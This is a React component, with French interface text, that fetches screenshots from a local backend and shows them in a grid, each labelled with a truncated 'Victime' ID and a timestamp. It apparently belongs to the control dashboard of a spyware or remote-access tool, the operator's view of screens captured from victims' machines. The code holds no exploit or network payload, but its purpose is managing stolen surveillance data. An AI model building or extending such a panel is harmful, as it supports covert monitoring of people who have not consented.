import React, { useState, useEffect } from 'react';
import { Typography, Box, Paper, Card, CardMedia, CardContent, CircularProgress, Grid } from '@mui/material';
import { logService } from '../services/api';

const ScreenshotsPage = () => {
    const [screenshots, setScreenshots] = useState([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const fetchAllScreenshots = async () => {
            try {
                const response = await fetch('http://localhost:5000/api/screenshots');
                const data = await response.json();
                setScreenshots(data);
            } catch (error) {
                console.error('Error fetching screenshots:', error);
            } finally {
                setLoading(false);
            }
        };
        fetchAllScreenshots();
    }, []);

    return (
        <Box>
            <Typography variant="h4" component="h1" gutterBottom>Toutes les Captures d'Écran</Typography>
            {loading ? (
                <Paper sx={{ p: 2, height: '75vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                    <CircularProgress />
                </Paper>
            ) : (
                <Grid container spacing={2}>
                    {screenshots.map((screenshot) => (
                        <Grid item xs={12} sm={6} md={4} lg={3} key={screenshot.id}>
                            <Card>
                                <CardMedia
                                    component="img"
                                    height="180"
                                    image={`http://localhost:5000/static/uploads/${screenshot.filename}`}
                                    alt="Screenshot"
                                />
                                <CardContent>
                                    <Typography variant="body2" color="textSecondary">
                                        Victime: {screenshot.victim_id.substring(0, 8)}...
                                    </Typography>
                                    <Typography variant="body2" color="textSecondary">
                                        {screenshot.timestamp}
                                    </Typography>
                                </CardContent>
                            </Card>
                        </Grid>
                    ))}
                </Grid>
            )}
        </Box>
    );
};

export default ScreenshotsPage;